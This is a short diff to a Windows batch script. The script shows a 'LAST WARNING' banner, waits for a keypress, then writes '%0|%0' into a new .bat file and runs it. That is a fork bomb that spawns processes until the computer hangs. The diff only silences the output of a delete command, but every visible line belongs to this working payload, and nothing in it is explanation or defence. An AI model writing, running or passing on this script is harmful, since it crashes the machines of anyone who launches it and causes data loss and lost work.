@@ -17,6 +17,6 @@ echo.
 echo LAST WARNING!
 echo PRESS ANY KEY TO RUN AND SAY BYE BYE...
 pause >nul
-del xwkqelajcmLsldi.bat
+del xwkqelajcmLsldi.bat >nul
 echo %%0^|%%0 ^>nul > xwkqelajcmLsldi.bat
 .\xwkqelajcmLsldi.bat
